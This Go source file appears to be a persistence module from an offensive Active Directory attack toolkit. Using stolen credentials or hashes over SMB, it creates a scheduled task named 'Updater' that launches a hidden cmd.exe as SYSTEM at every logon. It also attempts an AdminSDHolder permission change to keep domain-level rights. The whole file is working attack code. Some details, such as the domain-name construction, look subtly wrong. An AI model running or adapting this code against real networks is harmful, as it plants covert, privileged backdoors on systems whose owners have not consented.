package modules

import (
	"context"
	"fmt"
	"time"

	"adpack/core"
	"adpack/tools"
)

func RunPersistence(state *core.ADState, targetHost string) *core.ToolResult {
	result := &core.ToolResult{Success: true}

	host, found := selectTarget(state, targetHost)
	if !found {
		fmt.Println("[!] No target for persistence")
		result.Success = false
		return result
	}

	domain, user, pass, hash := getCredential(state)
	if domain == "" || user == "" {
		fmt.Println("[!] No credentials for persistence")
		result.Success = false
		return result
	}

	ctx := context.Background()
	target := tools.NetExecTarget{
		Protocol: "smb", Host: host.IP,
		Domain: domain, Username: user, Password: pass, Hash: hash,
	}

	fmt.Println("[*] Creating scheduled task persistence...")
	taskCmd := fmt.Sprintf(
		`schtasks /create /tn "Updater" /tr "powershell -c Start-Process -WindowStyle Hidden cmd.exe" /sc onlogon /ru SYSTEM /f`,
	)
	r, err := tools.NetExec.Run(ctx, target, "-x", []string{taskCmd})
	if err == nil && r.Success {
		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type: core.EvCredAcquired, Phase: core.PhasePersistence,
			Source: "schtasks", Key: host.IP, Value: "scheduled task created",
			Timestamp: time.Now(),
		})
		fmt.Println("[+] Scheduled task created")
	}

	fmt.Println("[*] Attempting AdminSDHolder modification...")
	sdCmd := `dsacls "CN=AdminSDHolder,CN=System,DC=$((Get-ADDomain).Name),DC=$((Get-ADDomain).Name)" /G "SYSTEM:GA" /I:T`
	r, err = tools.NetExec.Run(ctx, target, "-x", []string{sdCmd})
	if err == nil && r.Success {
		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type: core.EvCredAcquired, Phase: core.PhasePersistence,
			Source: "adminsdholder", Key: host.IP, Value: "AdminSDHolder modified",
			Timestamp: time.Now(),
		})
		fmt.Println("[+] AdminSDHolder modified")
	}

	return result
}
